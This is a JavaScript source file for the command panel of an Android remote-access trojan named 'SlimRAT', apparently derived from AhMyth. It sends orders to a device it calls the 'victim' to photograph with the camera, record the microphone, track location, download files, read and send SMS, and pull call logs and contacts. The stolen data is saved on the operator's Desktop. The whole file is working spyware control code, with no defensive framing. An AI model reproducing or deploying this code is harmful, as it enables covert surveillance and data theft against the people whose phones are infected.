var app = angular.module('LabApp', ['ngRoute', 'infinite-scroll']);
const { ipcRenderer } = require('electron');
const { remote } = require('electron');
var homeDir = require('homedir');
var fs = require('fs-extra');
var path = require('path');
var socket = remote.getCurrentWebContents().victim;
var ORDER = 'order';

var dataPath = path.join(homeDir(), 'Desktop');
var downloadsPath = path.join(dataPath, 'SlimRAT');

app.config(function($routeProvider) {
  $routeProvider
  .when('/', {
    templateUrl: './views/main.html'
  })
  .when('/camera', {
    templateUrl: './views/camera.html',
    controller: 'CamCtrl'
  })
  .when('/fileManager', {
    templateUrl: './views/fileManager.html',
    controller: 'FmCtrl'
  })
  .when('/smsManager', {
    templateUrl: './views/smsManager.html',
    controller: 'SMSCtrl'
  })
  .when('/callsLogs', {
    templateUrl: './views/callsLogs.html',
    controller: 'CallsCtrl'
  })
  .when('/contacts', {
    templateUrl: './views/contacts.html',
    controller: 'ContCtrl'
  })
  .when('/mic', {
    templateUrl: './views/mic.html',
    controller: 'MicCtrl'
  })
  .when('/location', {
    templateUrl: './views/location.html',
    controller: 'LocCtrl'
  });
});

app.controller('LabCtrl', function($scope, $rootScope, $location) {
  $labCtrl = $scope;
  $labCtrl.logs = [];
  $labCtrl.victim = {
    id: localStorage.getItem('victim_id'),
    manf: localStorage.getItem('victim_manf'),
    model: localStorage.getItem('victim_model'),
    release: localStorage.getItem('victim_release')
  };

  var log = document.getElementById('log');
  const window = remote.getCurrentWindow();

  $labCtrl.close = function() {
    window.close();
  };

  $labCtrl.minimize = function() {
    window.minimize();
  };

  $rootScope.Log = function(msg, status) {
    var fontColor = 'white';

    if (status == 1) {
      fontColor = 'green';
    } else if (status == 0) {
      fontColor = 'red';
    }

    $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
    log.scrollTop = log.scrollHeight;

    if (!$labCtrl.$$phase) {
      $labCtrl.$apply();
    }
  };

  ipcRenderer.on('SocketIO:VictimDisconnected', function(event) {
    $rootScope.Log('Victim Disconnected', 0);
  });

  $labCtrl.goToPage = function(page) {
    $location.path('/' + page);
  };
});

app.controller('CamCtrl', function($scope, $rootScope) {
  $camCtrl = $scope;
  $camCtrl.isCamera = true;
  var camera = 'x0000ca';

  $camCtrl.$on('$destroy', function() {
    socket.removeAllListeners(camera);
  });

  $rootScope.Log('Get cameras list');
  $camCtrl.load = 'loading';

  socket.emit(ORDER, { order: camera, extra: 'camList' });

  socket.on(camera, function(data) {
    if (data.camList == true) {
      $rootScope.Log('Cameras list arrived', 1);
      $camCtrl.cameras = data.list;
      $camCtrl.load = '';
      $camCtrl.selectedCam = $camCtrl.cameras[1];
      $camCtrl.$apply();
    } else if (data.image == true) {
      $rootScope.Log('Picture arrived', 1);
      var uint8Arr = new Uint8Array(data.buffer);
      var binary = '';
      for (var i = 0; i < uint8Arr.length; i++) {
        binary += String.fromCharCode(uint8Arr[i]);
      }
      var base64String = window.btoa(binary);
      $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
      $camCtrl.isCamera = false;
      $camCtrl.$apply();
      $camCtrl.savePhoto = function() {
        $rootScope.Log('Saving picture..');
        var picPath = path.join(downloadsPath, Date.now() + '.jpg');

        fs.outputFile(picPath, new Buffer(base64String, 'base64'), function(err) {
          if (!err) {
            $rootScope.Log('Picture saved on ' + picPath, 1);
          } else {
            $rootScope.Log('Saving picture failed', 0);
          }
        });
      };
    }
  });

  $camCtrl.snap = function() {
    $rootScope.Log('Snap a picture');
    socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
  };
});

app.controller('FmCtrl', function($scope, $rootScope) {
  $fmCtrl = $scope;
  $fmCtrl.files = [];
  $fmCtrl.load = 'loading';
  var fileManager = 'x0000fm';

  $fmCtrl.$on('$destroy', function() {
    socket.removeAllListeners(fileManager);
  });

  $fmCtrl.barLimit = 30;
  $fmCtrl.increaseLimit = function() {
    $fmCtrl.barLimit += 30;
  };

  $rootScope.Log('Get files list');
  socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' });

  socket.on(fileManager, function(data) {
    if (data.file == true) {
      $rootScope.Log('Saving file..');
      var filePath = path.join(downloadsPath, data.name);

      fs.outputFile(filePath, data.buffer, function(err) {
        if (err) {
          $rootScope.Log('Saving file failed', 0)
        } else {
          $rootScope.Log('File saved on ' + filePath, 1)
        }
      });
    } else if (data.length != 0) {
      $rootScope.Log('Files list arrived', 1);
      $fmCtrl.load = '';
      $fmCtrl.files = data;
      $fmCtrl.$apply();
    } else {
      $rootScope.Log('That directory is inaccessible', 0);
      $fmCtrl.load = '';
      $fmCtrl.$apply();
    }
  });

  $fmCtrl.getFiles = function(file) {
    if (file != null) {
      $fmCtrl.load = 'loading';
      $rootScope.Log('Get ' + file);
      socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + file });
    }
  };

  $fmCtrl.saveFile = function(file) {
    $rootScope.Log('Downloading ' + '/' + file);
    socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
  };
});

app.controller('SMSCtrl', function($scope, $rootScope) {
  $SMSCtrl = $scope;
  $SMSCtrl.smsList = [];
  var sms = 'x0000sm';

  $SMSCtrl.$on('$destroy', function() {
    socket.removeAllListeners(sms);
  });

  $SMSCtrl.load = 'loading';
  $rootScope.Log('Get SMS list..');
  socket.emit(ORDER, { order: sms, extra: 'ls' });

  $SMSCtrl.barLimit = 50;
  $SMSCtrl.increaseLimit = function() {
    $SMSCtrl.barLimit += 50;
  };

  $('.sms-manager .collapsible').collapsible();

  $SMSCtrl.SendSMS = function(phoneNo, msg) {
    $rootScope.Log('Sending SMS..');
    socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
  };

  $SMSCtrl.SaveSMS = function() {
    if ($SMSCtrl.smsList.length == 0) return;
    var csvRows = [];
    for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
      csvRows.push($SMSCtrl.smsList[i].phoneNo + ',' + $SMSCtrl.smsList[i].msg);
    }
    var csvStr = csvRows.join('\n');
    var csvPath = path.join(downloadsPath, 'SMS_' + Date.now() + '.csv');
    $rootScope.Log('Saving SMS List...');

    fs.outputFile(csvPath, csvStr, function(error) {
      if (error) {
        $rootScope.Log('Saving ' + csvPath + ' Failed', 0);
      } else {
        $rootScope.Log('SMS List Saved on ' + csvPath, 1);
      }
    });
  };

  socket.on(sms, function(data) {
    if (data.smsList) {
      $SMSCtrl.load = '';
      $rootScope.Log('SMS list arrived', 1);
      $SMSCtrl.smsList = data.smsList;
      $SMSCtrl.smsSize = data.smsList.length;
      $SMSCtrl.$apply();
    } else {
      if (data == true) {
        $rootScope.Log('SMS sent', 1);
      } else {
        $rootScope.Log('SMS not sent', 0);
      }
    }
  });
});

app.controller('CallsCtrl', function($scope, $rootScope) {
  $CallsCtrl = $scope;
  $CallsCtrl.callsList = [];
  var calls = 'x0000cl';

  $CallsCtrl.$on('$destroy', function() {
    socket.removeAllListeners(calls);
  });

  $CallsCtrl.load = 'loading';
  $rootScope.Log('Get Calls list..');
  socket.emit(ORDER, { order: calls });

  $CallsCtrl.barLimit = 50;
  $CallsCtrl.increaseLimit = function() {
    $CallsCtrl.barLimit += 50;
  };

  $CallsCtrl.SaveCalls = function() {
    if ($CallsCtrl.callsList.length == 0) return;

    var csvRows = [];
    for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
      var type = $CallsCtrl.callsList[i].type == 1 ? 'INCOMING' : 'OUTGOING';
      var name = $CallsCtrl.callsList[i].name == null ? 'Unknown' : $CallsCtrl.callsList[i].name;
      csvRows.push($CallsCtrl.callsList[i].phoneNo + ',' + name + ',' + $CallsCtrl.callsList[i].duration + ',' + type);
    }

    var csvStr = csvRows.join('\n');
    var csvPath = path.join(downloadsPath, 'Calls_' + Date.now() + '.csv');
    $rootScope.Log('Saving Calls List...');
    fs.outputFile(csvPath, csvStr, function(error) {
      if (error) {
        $rootScope.Log('Saving ' + csvPath + ' Failed', 0);
      } else {
        $rootScope.Log('Calls List Saved on ' + csvPath, 1);
      }
    });
  };

  socket.on(calls, function(data) {
    if (data.callsList) {
      $CallsCtrl.load = '';
      $rootScope.Log('Calls list arrived', 1);
      $CallsCtrl.callsList = data.callsList;
      $CallsCtrl.logsSize = data.callsList.length;
      $CallsCtrl.$apply();
    }
  });
});

app.controller('ContCtrl', function($scope, $rootScope) {
  $ContCtrl = $scope;
  $ContCtrl.contactsList = [];
  var contacts = 'x0000cn';

  $ContCtrl.$on('$destroy', function() {
    socket.removeAllListeners(contacts);
  });

  $ContCtrl.load = 'loading';
  $rootScope.Log('Get Contacts list..');
  socket.emit(ORDER, { order: contacts });

  $ContCtrl.barLimit = 50;
  $ContCtrl.increaseLimit = function() {
    $ContCtrl.barLimit += 50;
  };

  $ContCtrl.SaveContacts = function() {
    if ($ContCtrl.contactsList.length == 0) return;

    var csvRows = [];
    for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
      csvRows.push($ContCtrl.contactsList[i].phoneNo + ',' + $ContCtrl.contactsList[i].name);
    }

    var csvStr = csvRows.join('\n');
    var csvPath = path.join(downloadsPath, 'Contacts_' + Date.now() + '.csv');
    $rootScope.Log('Saving Contacts List...');
    fs.outputFile(csvPath, csvStr, function(error) {
      if (error) {
        $rootScope.Log('Saving ' + csvPath + ' Failed', 0);
      } else {
        $rootScope.Log('Contacts List Saved on ' + csvPath, 1);
      }
    });
  };

  socket.on(contacts, function(data) {
    if (data.contactsList) {
      $ContCtrl.load = '';
      $rootScope.Log('Contacts list arrived', 1);
      $ContCtrl.contactsList = data.contactsList;
      $ContCtrl.contactsSize = data.contactsList.length;
      $ContCtrl.$apply();
    }
  });
});

app.controller('MicCtrl', function($scope, $rootScope) {
  $MicCtrl = $scope;
  $MicCtrl.isAudio = true;
  var mic = 'x0000mc';

  $MicCtrl.$on('$destroy', function() {
    socket.removeAllListeners(mic);
  });

  $MicCtrl.Record = function(seconds) {
    if (seconds) {
      if (seconds > 0) {
        $rootScope.Log('Recording ' + seconds + 's...');
        socket.emit(ORDER, { order: mic, sec: seconds });
        $('.record .preloader-wrapper').addClass('active');
      } else {
        $rootScope.Log('Seconds must be more than 0');
      }
    }
  };

  $MicCtrl.showTime = function(seconds) {
    var minutes = '0' + Math.floor(seconds / 60);
    var seconds = '0' + (seconds - minutes * 60);
    var time = minutes.substr(-2) + ':' + seconds.substr(-2);
    $('.record .range-field label span').text(time);
  };

  socket.on(mic, function(data) {
    if (data.file == true) {
      $rootScope.Log('Audio arrived', 1);
      var player = document.getElementById('player');
      var sourceMp3 = document.getElementById('sourceMp3');
      var uint8Arr = new Uint8Array(data.buffer);
      var binary = '';
      for (var i = 0; i < uint8Arr.length; i++) {
        binary += String.fromCharCode(uint8Arr[i]);
      }
      var base64String = window.btoa(binary);

      $MicCtrl.isAudio = false;
      $MicCtrl.$apply();
      sourceMp3.src = 'data:audio/mp3;base64,' + base64String;
      player.load();
      $('.record .preloader-wrapper').removeClass('active');

      $MicCtrl.SaveAudio = function() {
        $rootScope.Log('Saving file..');
        var filePath = path.join(downloadsPath, data.name);
        fs.outputFile(filePath, data.buffer, function(err) {
          if (err) {
            $rootScope.Log('Saving file failed', 0);
          } else {
            $rootScope.Log('File saved on ' + filePath, 1);
          }
        });
      };
    }
  });
});

app.controller('LocCtrl', function($scope, $rootScope) {
  $LocCtrl = $scope;
  var location = 'x0000lm';

  $LocCtrl.$on('$destroy', function() {
    socket.removeAllListeners(location);
  });

  var map = L.map('mapid').setView([51.505, -0.09], 16);
  L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);

  $LocCtrl.Refresh = function() {
    $LocCtrl.load = 'loading';
    $rootScope.Log('Get Location..');
    socket.emit(ORDER, { order: location });
  };

  $LocCtrl.load = 'loading';
  $rootScope.Log('Get Location..');
  socket.emit(ORDER, { order: location });

  var marker;
  socket.on(location, function(data) {
    $LocCtrl.load = '';
    if (data.enable) {
      if (data.lat == 0 && data.lng == 0) {
        $rootScope.Log('Try to Refresh', 0);
      } else {
        $rootScope.Log('Location arrived => ' + data.lat + ',' + data.lng, 1);
        var victimLoc = new L.LatLng(data.lat, data.lng);
        if (!marker) {
          var marker = L.marker(victimLoc).addTo(map);
        } else {
          marker.setLatLng(victimLoc).update();
        }
        map.panTo(victimLoc);
      }
    } else {
      $rootScope.Log('Location Service is not enabled on Victim\'s Device', 0);
    }
  });
});

